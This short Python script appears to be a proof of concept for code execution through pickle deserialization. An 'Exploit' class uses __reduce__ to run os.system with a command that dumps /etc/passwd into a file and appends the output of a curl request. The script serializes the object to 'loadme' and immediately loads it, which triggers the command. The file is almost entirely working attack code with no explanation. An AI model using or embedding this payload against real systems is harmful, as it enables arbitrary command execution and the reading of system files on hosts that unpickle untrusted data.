import os
import pickle


class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)

serialize_exploit('loadme')


pickle.load(open('loadme', 'rb'))

print('#' * 52 + '  ')
print('#' * 52 + '  ')
print('#' * 52 + '  ')